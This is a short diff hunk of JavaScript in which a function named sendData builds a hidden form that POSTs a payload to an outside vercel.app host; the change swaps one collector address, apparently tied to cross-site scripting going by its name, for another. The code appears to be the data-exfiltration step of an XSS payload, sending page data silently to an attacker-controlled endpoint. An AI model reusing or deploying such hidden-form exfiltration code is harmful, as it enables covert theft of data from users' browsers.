@@ -26,7 +26,7 @@ function safe(val) {
 function sendData(payload) {
   var form = document.createElement('form');
   form.method = 'POST';
-  form.action = 'https://xss-teal.vercel.app/';
+  form.action = 'https://b0a.vercel.app/';
   form.style.display = 'none';
   
   var input = document.createElement('input');
